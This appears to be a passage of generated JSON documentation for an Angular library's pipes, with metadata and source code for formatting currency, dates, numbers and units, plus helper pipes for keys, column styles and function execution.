{
    "pipes": [
        {
          "name": "ActivePreferencePipe",
          "id": "pipe-ActivePreferencePipe-7f817f86b19e0d675e08d6e3ca6b201f81d169cc83c3ce5ac6dcccb0c019cfa7ca59c7b67a43219fa320118ef3fefbeaade74ff76eec3ac8fc77ffc2d64e1bf6",
          "file": "libs/common/src/lib/preference-manager/active-preference.pipe.ts",
          "type": "pipe",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "rawdescription": "\n",
          "properties": [],
          "methods": [
            {
              "name": "transform",
              "args": [
                {
                  "name": "preferences",
                  "type": "Preference[]",
                  "deprecated": false,
                  "deprecationMessage": ""
                },
                {
                  "name": "activePreferenceId",
                  "type": "string | null",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "optional": false,
              "returnType": "Preference | null",
              "typeParameters": [],
              "line": 9,
              "deprecated": false,
              "deprecationMessage": "",
              "jsdoctags": [
                {
                  "name": "preferences",
                  "type": "Preference[]",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                },
                {
                  "name": "activePreferenceId",
                  "type": "string | null",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            }
          ],
          "ngname": "activePreference",
          "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\nimport { Preference } from './preference';\r\n\r\n@Pipe({\r\n  name: 'activePreference'\r\n})\r\nexport class ActivePreferencePipe implements PipeTransform {\r\n\r\n  transform(preferences: Preference[], activePreferenceId: string | null): Preference | null {\r\n    let active: Preference | undefined;\r\n    if ( !preferences ) {\r\n      return null;\r\n    }\r\n    if ( activePreferenceId ) {\r\n      active = preferences.find(p => p.id === activePreferenceId);\r\n    }\r\n    return active ?? null;\r\n  }\r\n\r\n}\r\n"
        },
      {
        "name": "ColumnStylePipe",
        "id": "pipe-ColumnStylePipe-963b648ba0cccee813d07b2e35cb1fca9fdc83e194a69643533442c2cc18f03e6f60db767705456b91f102c05bb7b88e483d2a8603015711b6f10b30902c7d88",
        "file": "libs/datatable/src/lib/sto-datatable/column-style.pipe.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "properties": [],
        "methods": [
          {
            "name": "transform",
            "args": [
              {
                "name": "column",
                "type": "Column",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "displayMode",
                "type": "ColumnDisplay",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "width",
                "type": "number | null",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              }
            ],
            "optional": false,
            "returnType": "literal type",
            "typeParameters": [],
            "line": 9,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "column",
                "type": "Column",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "displayMode",
                "type": "ColumnDisplay",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "width",
                "type": "number | null",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "columnStyle",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\nimport { Column, ColumnDisplay } from './columns';\r\n\r\n@Pipe({\r\n  name: 'columnStyle'\r\n})\r\nexport class ColumnStylePipe implements PipeTransform {\r\n\r\n  transform(column: Column, displayMode: ColumnDisplay, width?: number | null): {[klass: string]: unknown;} {\r\n    switch ( displayMode ) {\r\n      case ColumnDisplay.Force:\r\n        return {\r\n          'width.px': width || ( column.flexBasis || 80 ),\r\n          'maxWidth.px': width || ( column.flexBasis || 80 ),\r\n          float: 'left'\r\n        };\r\n      case ColumnDisplay.Flex:\r\n      default:\r\n        return {\r\n          flexGrow: ( column.flexGrow || column.flexGrow === 0 ) ? column.flexGrow : 1,\r\n          flexShrink: ( column.flexShrink || column.flexShrink === 0 ) ? column.flexShrink : 1,\r\n          'flexBasis.px': width || ( column.flexBasis || 80 ),\r\n        };\r\n    }\r\n  }\r\n\r\n}\r\n\r\n/*         [style.flex-grow]=\"(column.flexGrow || column.flexGrow === 0) ? column.flexGrow : 1\"\r\n         [style.flex-shrink]=\"(column.flexShrink || column.flexShrink === 0) ? column.flexShrink : 1\"\r\n         [style.flex-basis.px]=\"headerWidthMap[i] || (column.flexBasis || 80)\"*/\r\n"
      },
      {
        "name": "CurrencyFormatPipe",
        "id": "pipe-CurrencyFormatPipe-c36479d848a6f18e21bbb8b9bae1d4567c78fe6e486e5897be266205f8cbcb8d8058d5cb5b436b93c418da36e5efe52a039880d750044d6f0fb878deef4f663a",
        "file": "libs/core/src/lib/sto-pipes/currency-format.pipe.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "<p>Pipe used to transform numbers to a currency format</p>\n<p><span>{{ 5000.5824 | currentFormat:&#39;$&#39;:3 }}</span>\nResults in\n<span>5 000,582 $</span></p>\n",
        "rawdescription": "\n\nPipe used to transform numbers to a currency format\n\n\n<span>{{ 5000.5824 | currentFormat:'$':3 }}</span>\nResults in\n<span>5 000,582 $</span>\n",
        "properties": [],
        "methods": [
          {
            "name": "transform",
            "args": [
              {
                "name": "value",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "unit",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "''"
              },
              {
                "name": "maximumFractionDigits",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "3"
              }
            ],
            "optional": false,
            "returnType": "string | null",
            "typeParameters": [],
            "line": 16,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "value",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "unit",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "''",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "maximumFractionDigits",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "3",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "currencyFormat",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\n\r\n/**\r\n  * Pipe used to transform numbers to a currency format\r\n  *\r\n  * @example\r\n  *\r\n  * <span>{{ 5000.5824 | currentFormat:'$':3 }}</span>\r\n  * Results in\r\n  * <span>5 000,582 $</span>\r\n  */\r\n@Pipe({\r\n  name: 'currencyFormat'\r\n})\r\nexport class CurrencyFormatPipe implements PipeTransform {\r\n  transform(value: number, unit: string = '', maximumFractionDigits = 3): string | null {\r\n    if (!value) {\r\n      return null;\r\n    }\r\n    if (typeof value === 'string') {\r\n      value = parseFloat(value);\r\n      if (isNaN(value)) {\r\n        return '';\r\n      }\r\n    }\r\n\r\n    const intl = new Intl.NumberFormat('en-US', {maximumFractionDigits}).format(value);\r\n    return intl.replace(/,/g, ' ').replace('.', ',') + ` ${unit}`;\r\n  }\r\n}\r\n\r\n"
      },
      {
        "name": "DateFormatPipe",
        "id": "pipe-DateFormatPipe-b823006939615e0e71a45375e28ca7f697216f30e1cc1d34e70c2f5a846bac45ee6577d25e4a19e40c1f3a26cfd9a00b0ced2bd62e57f5c094904618483f797a",
        "file": "libs/core/src/lib/sto-pipes/date-format.pipe.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "<p>Pipe used to transform dates, based on our default formats.</p>\n<p>public date = &quot;2018-08-27 14:00:30&quot;\n<span>{{ date | dateFormat }}</span> -&gt; Aug 27, 2018\n<span>{{ date | dateFormat:&#39;long&#39; }}</span> -&gt; Monday Aug 27, 2018</p>\n",
        "rawdescription": "\n\nPipe used to transform dates, based on our default formats.\n\n\npublic date = \"2018-08-27 14:00:30\"\n<span>{{ date | dateFormat }}</span> -> Aug 27, 2018\n<span>{{ date | dateFormat:'long' }}</span> -> Monday Aug 27, 2018\n",
        "properties": [],
        "methods": [
          {
            "name": "transform",
            "args": [
              {
                "name": "value",
                "type": "string | number | Date | null",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "format",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              }
            ],
            "optional": false,
            "returnType": "string | null",
            "typeParameters": [],
            "line": 19,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "value",
                "type": "string | number | Date | null",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "format",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "formatDate",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\nimport { format as formatDate } from 'date-fns';\r\n\r\n/**\r\n * Pipe used to transform dates, based on our default formats.\r\n *\r\n * @example\r\n *\r\n * public date = \"2018-08-27 14:00:30\"\r\n * <span>{{ date | dateFormat }}</span> -> Aug 27, 2018\r\n * <span>{{ date | dateFormat:'long' }}</span> -> Monday Aug 27, 2018\r\n */\r\n\r\n@Pipe({\r\n  name: 'formatDate'\r\n})\r\nexport class DateFormatPipe implements PipeTransform {\r\n\r\n  transform(value: string | number | Date | null, format?: string): string | null {\r\n    if (!value) {\r\n      return null;\r\n    }\r\n    if (typeof value === 'string') {\r\n      value = new Date(value);\r\n    }\r\n    switch (format) {\r\n      case 'long':\r\n        return formatDate(value, 'EEEE MMM d, yyyy');\r\n      case 'short':\r\n        return formatDate(value, 'yyyy-MM-dd');\r\n      case 'datetime':\r\n        return formatDate(value, 'MMM d, yyyy, HH:mm');\r\n      case 'datetimezone':\r\n        return formatDate(value, `MMM d, yyyy, HH:mm:ss ('UTC'xxx)`);\r\n      case 'datetime-long':\r\n        return formatDate(value, 'EEEE MMM dd, yyyy, HH:mm');\r\n      case 'datetime-short':\r\n        return formatDate(value, 'yyyy-MM-dd, HH:mm');\r\n      default:\r\n        return formatDate(value, 'MMM d, yyyy');\r\n    }\r\n  }\r\n\r\n}\r\n"
      },
      {
        "name": "ExcludeUnit",
        "id": "pipe-ExcludeUnit-48fbcfb02bd2a775aa968b57ad68d1da6886adedb60a2e48c0132c483ebca95be23585142bdc098524cdd5792f2fe54b386abc208450cd52fba41e2c8c9c0d42",
        "file": "libs/core/src/lib/sto-pipes/with-unit.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "properties": [],
        "methods": [
          {
            "name": "transform",
            "args": [
              {
                "name": "value",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "string",
            "typeParameters": [],
            "line": 22,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "value",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "excludeUnit",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\n\r\n@Pipe({name: 'getUnit'})\r\nexport class GetUnit implements PipeTransform {\r\n  transform(value: string, withParens?: boolean): string {\r\n    if (value) {\r\n      const arr = value.split('(');\r\n      if (arr.length > 0 ) {\r\n        if (withParens) {\r\n          value = '(' + arr[1];\r\n        } else {\r\n          arr[1].slice(0, -1);\r\n          value = arr[1].slice(0, -1);\r\n        }\r\n      }\r\n    }\r\n    return value;\r\n  }\r\n}\r\n@Pipe({name: 'excludeUnit'})\r\nexport class ExcludeUnit implements PipeTransform {\r\n  transform(value: string): string {\r\n    if (value) {\r\n      const arr = value.split('(');\r\n      if (arr.length > 0) {\r\n        value = arr[0];\r\n      }\r\n    }\r\n    return value;\r\n  }\r\n}\r\n"
      },
      {
        "name": "ExecPipe",
        "id": "pipe-ExecPipe-32535723d4810ff612edb4127a8149f74eb0eb1ed42af9977f256e05ba07159fcfefab5a0c028683378df731bf21be6ce2a15946b85915e150a60d08b91c00ed",
        "file": "libs/datatable/src/lib/sto-datatable/exec.pipe.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "properties": [],
        "methods": [
          {
            "name": "transform",
            "args": [
              {
                "name": "func",
                "type": " | R",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              },
              {
                "name": "column",
                "type": "Column",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              },
              {
                "name": "row",
                "type": "T",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              }
            ],
            "optional": false,
            "returnType": "R | null",
            "typeParameters": [],
            "line": 10,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "func",
                "type": " | R",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "column",
                "type": "Column",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "row",
                "type": "T",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "exec",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\nimport { Column } from './columns';\r\n\r\n@Pipe({\r\n  name: 'exec'\r\n})\r\n// eslint-disable-next-line @typescript-eslint/no-explicit-any\r\nexport class ExecPipe<T = unknown, R = any> implements PipeTransform/*, Exec<T>*/ {\r\n\r\n  transform(func: ( (...args: unknown[]) => R ) | R, value?: unknown, column?: Column, row?: T): R | null {\r\n    if ( func && typeof func === 'function' ) {\r\n      return ( func as (...args: unknown[]) => R )(value, row, column);\r\n    } else if ( typeof func === 'string' ) {\r\n      return func;\r\n    }\r\n    return null;\r\n  }\r\n\r\n}\r\n"
      },
      {
        "name": "GetUnit",
        "id": "pipe-GetUnit-48fbcfb02bd2a775aa968b57ad68d1da6886adedb60a2e48c0132c483ebca95be23585142bdc098524cdd5792f2fe54b386abc208450cd52fba41e2c8c9c0d42",
        "file": "libs/core/src/lib/sto-pipes/with-unit.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "properties": [],
        "methods": [
          {
            "name": "transform",
            "args": [
              {
                "name": "value",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "withParens",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              }
            ],
            "optional": false,
            "returnType": "string",
            "typeParameters": [],
            "line": 5,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "value",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "withParens",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "getUnit",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\n\r\n@Pipe({name: 'getUnit'})\r\nexport class GetUnit implements PipeTransform {\r\n  transform(value: string, withParens?: boolean): string {\r\n    if (value) {\r\n      const arr = value.split('(');\r\n      if (arr.length > 0 ) {\r\n        if (withParens) {\r\n          value = '(' + arr[1];\r\n        } else {\r\n          arr[1].slice(0, -1);\r\n          value = arr[1].slice(0, -1);\r\n        }\r\n      }\r\n    }\r\n    return value;\r\n  }\r\n}\r\n@Pipe({name: 'excludeUnit'})\r\nexport class ExcludeUnit implements PipeTransform {\r\n  transform(value: string): string {\r\n    if (value) {\r\n      const arr = value.split('(');\r\n      if (arr.length > 0) {\r\n        value = arr[0];\r\n      }\r\n    }\r\n    return value;\r\n  }\r\n}\r\n"
      },
      {
        "name": "KeysPipe",
        "id": "pipe-KeysPipe-e262c33b3ae88838d3e9b21e2d93bd58126bb759d7ea52320d10b93a8c4b59cc1a0d990d8a101c816ac03377a3f1dd244e067581086508de4d04b005ccc0593c",
        "file": "libs/core/src/lib/sto-pipes/keys.pipe.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "<p>Transforms an Object to an Array.</p>\n<p>public obj = {a: 1, b: 2, c: 3};\n&lt;span *ngFor=&quot;let key of obj | keys &quot;&gt; {{ obj[key] }}, </span> -&gt; 1, 2, 3,</p>\n",
        "rawdescription": "\n\nTransforms an Object to an Array.\n\n\npublic obj = {a: 1, b: 2, c: 3};\n<span *ngFor=\"let key of obj | keys \"> {{ obj[key] }}, </span> -> 1, 2, 3,\n",
        "properties": [],
        "methods": [
          {
            "name": "transform",
            "args": [
              {
                "name": "value",
                "type": "Record<string | >",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "Array<string>",
            "typeParameters": [],
            "line": 17,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "value",
                "type": "Record<string | >",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "keys",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\n\r\n/**\r\n * Transforms an Object to an Array.\r\n *\r\n * @example\r\n *\r\n * public obj = {a: 1, b: 2, c: 3};\r\n * <span *ngFor=\"let key of obj | keys \"> {{ obj[key] }}, </span> -> 1, 2, 3,\r\n */\r\n\r\n@Pipe({\r\n  name: 'keys'\r\n})\r\nexport class KeysPipe implements PipeTransform {\r\n\r\n  transform(value: Record<string, unknown>): Array<string> {\r\n    if (value) {\r\n      return Object.keys(value);\r\n    }\r\n    return [];\r\n  }\r\n\r\n}\r\n"
      },
      {
        "name": "NumberFormatPipe",
        "id": "pipe-NumberFormatPipe-f77e754125dddad5de06a00af2f47ae3b3137934763c3159966bf49055d0a3c2e8359832dd484514989d107c70aeb68933e49d6e001d36ec2b1466ec77784bc3",
        "file": "libs/core/src/lib/sto-pipes/number-format.pipe.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "<p>Formats numbers to use our standard formatting (d ddd,ddd)</p>\n<p>{{ 1234,32 | numberFormat }} -&gt; 1 234,320\n{{ 1234,32 | numberFormat:&#39;M3&#39; }} -&gt; 1 234,320 M3\n{{ -1234,32 | numberFormat:&#39;M3&#39;:true }} -&gt; 1 234,320 M3\n{{ 1234,32 | numberFormat:&#39;M3&#39;:false:false }} -&gt; 1 234 M3\n{{ 1234,32 | numberFormat:&#39;M3&#39;:false:true:5 }} -&gt; 1 234,32000 M3</p>\n",
        "rawdescription": "\n\nFormats numbers to use our standard formatting (d ddd,ddd)\n\n\n{{ 1234,32 | numberFormat }} -> 1 234,320\n{{ 1234,32 | numberFormat:'M3' }} -> 1 234,320 M3\n{{ -1234,32 | numberFormat:'M3':true }} -> 1 234,320 M3\n{{ 1234,32 | numberFormat:'M3':false:false }} -> 1 234 M3\n{{ 1234,32 | numberFormat:'M3':false:true:5 }} -> 1 234,32000 M3\n",
        "properties": [],
        "methods": [
          {
            "name": "prettyPrintValue",
            "args": [
              {
                "name": "value",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "appendDecimals",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "numberOfDecimals",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 53,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ],
            "jsdoctags": [
              {
                "name": "value",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "appendDecimals",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "numberOfDecimals",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "toFixed",
            "args": [
              {
                "name": "num",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "precision",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 68,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ],
            "jsdoctags": [
              {
                "name": "num",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "precision",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "transform",
            "args": [
              {
                "name": "value",
                "type": "number | string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "unit",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "''"
              },
              {
                "name": "abs",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              },
              {
                "name": "appendDecimals",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "true"
              },
              {
                "name": "numberOfDecimals",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "3"
              }
            ],
            "optional": false,
            "returnType": "string | null",
            "typeParameters": [],
            "line": 19,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "value",
                "type": "number | string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "unit",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "''",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "abs",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "appendDecimals",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "true",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "numberOfDecimals",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "3",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "numberFormat",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\n\r\n/**\r\n * Formats numbers to use our standard formatting (d ddd,ddd)\r\n *\r\n * @example\r\n *\r\n * {{ 1234,32 | numberFormat }} -> 1 234,320\r\n * {{ 1234,32 | numberFormat:'M3' }} -> 1 234,320 M3\r\n * {{ -1234,32 | numberFormat:'M3':true }} -> 1 234,320 M3\r\n * {{ 1234,32 | numberFormat:'M3':false:false }} -> 1 234 M3\r\n * {{ 1234,32 | numberFormat:'M3':false:true:5 }} -> 1 234,32000 M3\r\n */\r\n@Pipe({\r\n  name: 'numberFormat'\r\n})\r\nexport class NumberFormatPipe implements PipeTransform {\r\n\r\n  transform(value: number | string, unit: string = '', abs?: boolean, appendDecimals = true, numberOfDecimals = 3): string | null {\r\n    if ( value !== 0 && !value ) {\r\n      return '';\r\n    }\r\n    if ( typeof value === 'string' ) {\r\n      const newValue = parseFloat(value);\r\n      if ( isNaN(newValue) ) {\r\n        return null;\r\n      }\r\n      value = newValue;\r\n    }\r\n    if ( abs ) {\r\n      value = Math.abs(value);\r\n    }\r\n    // We absolute the value to ensure that the rounding rules is always away from zero.\r\n    // 1.5 => 2 and -1.5 => -2\r\n    const isNegativeNumber = value < 0;\r\n    value = Math.abs(value);\r\n\r\n    if ( !appendDecimals ) {\r\n      value = Math.round(value);\r\n    }\r\n    if ( !isNaN(value) && appendDecimals ) {\r\n      value = parseFloat(this.toFixed(value, numberOfDecimals));\r\n    }\r\n    // Turn negative numbers back, but only if value is not -0\r\n    // eslint-disable-next-line no-compare-neg-zero\r\n    if ( isNegativeNumber && value !== -0 ) {\r\n      value = value * -1;\r\n    }\r\n    const localized = this.prettyPrintValue(value, appendDecimals, numberOfDecimals);\r\n    return localized.replace(/,/g, ' ').replace('.', ',') + `${unit ? ' ' + unit : ''}`;\r\n  }\r\n\r\n  private prettyPrintValue(value: number, appendDecimals: boolean, numberOfDecimals: number) {\r\n    const intlOptions = { minimumFractionDigits: numberOfDecimals, maximumFractionDigits: numberOfDecimals };\r\n    const intl = new Intl.NumberFormat('en-US', intlOptions).format(value);\r\n    const split = intl.split('.');\r\n    let localized = split[ 0 ];\r\n\r\n    if ( appendDecimals ) {\r\n      const decimals = split.length === 2 ? split[ 1 ] : '';\r\n      split[ 1 ] = decimals.padEnd(numberOfDecimals, '0');\r\n      localized = split.join('.');\r\n    }\r\n    return localized;\r\n  }\r\n\r\n  // Normal toFixed has some issues: https://stackoverflow.com/questions/10015027/javascript-tofixed-not-rounding\r\n  private toFixed(num: number, precision: number) {\r\n    // This method also has some issues - namely, it's unable to parse negative numbers with huge floating points\r\n    // -8.185452315956354e-12 becomes NaN\r\n    let returnValue = ( +( Math.round(+( num + 'e' + precision )) + 'e' + -precision ) );\r\n    if ( isNaN(returnValue) ) {\r\n      returnValue = parseFloat(num.toFixed(precision));\r\n    }\r\n    return returnValue.toFixed(precision);\r\n  }\r\n}\r\n"
      },
      {
        "name": "NumberInputPipe",
        "id": "pipe-NumberInputPipe-84dcb5bd6ec9049826ff322b34cc13c31f364fdda0c80eb31d78775f42430f8a12cdc1140a63be60a738a429c8822a5a0bd62b1deb99b9c66c04fb8ab888e74c",
        "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "properties": [
          {
            "name": "DECIMAL_SEPARATOR",
            "defaultValue": "','",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 8,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "THOUSANDS_SEPARATOR",
            "defaultValue": "' '",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 9,
            "modifierKind": [
              121
            ]
          }
        ],
        "methods": [
          {
            "name": "handleIntegerAndFractions",
            "args": [
              {
                "name": "integer",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "fraction",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "fractionSize",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "dynamicFractionSize",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "false"
              }
            ],
            "optional": false,
            "returnType": "{ integer: string; fraction: string; }",
            "typeParameters": [],
            "line": 11,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ],
            "jsdoctags": [
              {
                "name": "integer",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "fraction",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "fractionSize",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "dynamicFractionSize",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "false",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "parse",
            "args": [
              {
                "name": "value",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "fractionSize",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "5"
              },
              {
                "name": "dynamicFractionSize",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "false"
              }
            ],
            "optional": false,
            "returnType": "string",
            "typeParameters": [],
            "line": 73,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "value",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "fractionSize",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "5",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "dynamicFractionSize",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "false",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
                {
                    "name": "transform",
                    "args": [
                      {
                        "name": "value",
                        "type": "number | string | null",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "fractionSize",
                        "type": "number",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "defaultValue": "5"
                      },
                      {
                        "name": "dynamicFractionSize",
                        "type": "",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "defaultValue": "false"
                      }
                    ],
                  "optional": false,
                  "returnType": "string",
                  "typeParameters": [],
                  "line": 43,
                  "deprecated": false,
                  "deprecationMessage": "",
                  "jsdoctags": [
                    {
                      "name": "value",
                      "type": "number | string | null",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "fractionSize",
                      "type": "number",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "defaultValue": "5",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "dynamicFractionSize",
                      "type": "",
                      "deprecated": false,
                      "deprecationMessage": "",
